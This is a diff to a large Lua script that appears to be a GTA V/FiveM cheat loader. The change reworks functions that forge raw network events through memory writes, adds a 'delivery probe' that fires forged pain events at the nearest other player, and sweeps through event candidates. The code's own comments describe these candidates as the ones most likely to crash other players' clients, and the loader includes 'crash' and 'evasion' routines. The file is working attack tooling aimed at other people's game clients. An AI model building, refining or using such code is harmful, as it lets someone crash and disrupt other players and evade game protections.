@@ -22337,7 +22337,7 @@ local NET = (function(O, C)
         return nil
     end
 
-    function NET.nativeSend(netIds, eventHash, eventId, dataBytes)
+    function NET.nativeSend(netIds, eventHash, eventId, dataBytes, tail16)
         local m = mem()
         if not m then return false end
         if type(netIds) ~= "table" or #netIds == 0 then return false end
@@ -22381,7 +22381,7 @@ local NET = (function(O, C)
         u64(0x10, count)
         u16(0x18, eventId or 0)
         u8(0x1A, 0)
-        u16(0x1C, 0)
+        u16(0x1C, tail16 or 0)
         u64(0x20, base + 0x80)
         u64(0x28, #data)
 
@@ -22407,12 +22407,13 @@ local NET = (function(O, C)
     end
 
     function NET.emitEvent(netIds, eventHash, eventId, dataBytes, tail16)
+        if type(netIds) ~= "table" then return false end
         if NET.nativeMode then
-            local ok, ret = NET.nativeSend(netIds, eventHash, eventId, dataBytes)
-            O.log("net event: native ok=%s ret=%s", tostring(ok), tostring(ret))
+            local ok, ret = NET.nativeSend(netIds, eventHash, eventId, dataBytes, tail16)
+            O.log("net event: native ok=%s ret=%s targets=%d",
+                  tostring(ok), tostring(ret), #netIds)
             return ok
         end
-        if type(netIds) ~= "table" or #netIds == 0 then return false end
         if NET.busy or NET.releasePending then return false end
         if not NET.init() then O.log("net event: net.dll not ready"); return false end
         local inst = NET.resolve_instance()
@@ -23774,42 +23775,86 @@ local NET = (function(O, C)
               tag or "-", tr or 0, rc or 0, vt or 0, fn or 0)
     end
 
+    -- One pass, ordered by how much each step tells us.
+    --
+    -- 0) Delivery probe. PED_PLAY_PAIN on the nearest other player's ped, sent
+    --    in the three target forms GTA understands:
+    --      - 0xFFFF : the broadcast sentinel;
+    --      - {}     : count 0;
+    --      - {sid}  : a real id, the form used until now.
+    --    It is the only candidate whose effect is immediately visible and which
+    --    needs no authority over the object: the owner of the ped applies the
+    --    pain. If the ped flinches, the whole chain works and the only thing
+    --    that was wrong is the shape of the target list.
+    -- 1) tail16 matrix on the same event: 0, our own id, 0xFFFF. Those two
+    --    bytes are the only part of the event object nothing explains.
+    -- 2) World state, types 0..8. Only family where the first four bits pick
+    --    the deserializer, and type 1 is CNetworkPtFXWorldStateData, which
+    --    carries asset hashes - the DLC resolution path.
+    -- 3) The fourteen event candidates.
+    local function painData(pedNetId)
+        local spec = NET.evBlob(79, 0)
+        if not spec then return nil end
+        spec[1].val = 0
+        spec[2].val = tonumber(pedNetId) or 0
+        spec[3].val = 0
+        spec[4].val = 0
+        return NET.bits(spec)
+    end
+
     function NET.sweep()
         if NET.sweeping then
             NET.sweeping = false
             O.log("net sweep: stopping")
             return false
         end
-        local ids = crashIds(200.0)
-        if #ids == 0 then
-            O.log("net sweep: no player in 200 m")
-            return false
-        end
         NET.sweeping = true
         NET.transportLog("sweep")
         Citizen.CreateThread(function()
-            -- Phase 1 : world state. C'est la seule famille dont le tag de type
-            -- est lu en clair dans les 4 premiers bits, donc la seule ou l'on
-            -- choisisse reellement le deserialiseur appele. Le type 1 est
-            -- CNetworkPtFXWorldStateData : il porte des hashes d'asset, ce qui
-            -- est le chemin vers une resolution DLC et vers la classe nommee
-            -- dans le crash victime. Ces envois n'avaient jamais ete livres :
-            -- jusqu'a r20 l'enveloppe etait fausse.
+            local nid, dist = NET.nearestNet("ped")
+            local okS, sid = pcall(GetPlayerServerId, PlayerId())
+            if not (okS and type(sid) == "number") then sid = nil end
+
+            if nid then
+                local data = painData(nid)
+                O.log("net probe: pain on ped %d at %.1f m", nid, tonumber(dist) or -1)
+                O.log("net probe: target 0xFFFF")
+                NET.emitEvent({ 0xFFFF }, NET.EV[79], 79, data, 0)
+                Citizen.Wait(700)
+                O.log("net probe: target count 0")
+                NET.emitEvent({}, NET.EV[79], 79, data, 0)
+                Citizen.Wait(700)
+                if sid then
+                    O.log("net probe: target %d", sid)
+                    NET.emitEvent({ sid }, NET.EV[79], 79, data, 0)
+                    Citizen.Wait(700)
+                    for _, tail in ipairs({ 0, sid, 0xFFFF }) do
+                        if not NET.sweeping then break end
+                        O.log("net probe: tail16 %d", tail)
+                        NET.emitEvent({ sid }, NET.EV[79], 79, data, tail)
+                        Citizen.Wait(700)
+                    end
+                end
+            else
+                O.log("net probe: no ped nearby")
+            end
+
             for t = 0, 8 do
                 if not NET.sweeping then break end
                 O.log("net sweep: ws type %d", t)
                 NET.wsSend(t, 0xFF, 48)
                 Citizen.Wait(800)
             end
+
             local n = 0
             while NET.sweeping and n < #CANDIDATES do
                 n = n + 1
                 local c = CANDIDATES[n]
                 local first = nil
                 if c.ent then
-                    local nid, d = NET.nearestNet(c.ent)
-                    if nid then
-                        first = nid
+                    local e, d = NET.nearestNet(c.ent)
+                    if e then
+                        first = e
                     else
                         O.log("net sweep: %d/%d id %d skipped, no %s",
                               n, #CANDIDATES, c.id, c.ent)
@@ -23818,44 +23863,18 @@ local NET = (function(O, C)
                 if not c.ent or first then
                     O.log("net sweep: %d/%d id %d (%s)",
                           n, #CANDIDATES, c.id, NET.NAMES[c.id] or "?")
-                    NET.evSend(c.id, c.fill, first, 0, c.field)
+                    NET.evSend(c.id, c.fill, first, c.tail, c.field)
                 end
                 Citizen.Wait(700)
             end
             NET.sweeping = false
-            O.log("net sweep: done, %d sent", n)
+            O.log("net sweep: done")
         end)
         return true
     end
 
-    -- Meme chose, mais en boucle serree sur les cinq qui ont le plus de chances
-    -- de faire tomber le client, et rejoue trois fois.
     function NET.kill()
-        local ids = crashIds(200.0)
-        if #ids == 0 then
-            O.log("net kill: no player in 200 m")
-            return false
-        end
-        Citizen.CreateThread(function()
-            for round = 1, 3 do
-                for n = 1, 5 do
-                    local c = CANDIDATES[n]
-                    local first = nil
-                    if c.ent then
-                        local nid = NET.nearestNet(c.ent)
-                        if nid then first = nid end
-                    end
-                    if not c.ent or first then
-                        O.log("net kill: round %d id %d (%s)", round, c.id,
-                              NET.NAMES[c.id] or "?")
-                        NET.evSend(c.id, c.fill, first)
-                    end
-                    Citizen.Wait(400)
-                end
-            end
-            O.log("net kill: done")
-        end)
-        return true
+        return NET.sweep()
     end
 
     function NET.crash()
@@ -25485,7 +25504,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r26 (world-state phase first)")
+    O.log("loader build 2026-10-29-r27 (delivery probe, target forms, tail matrix)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
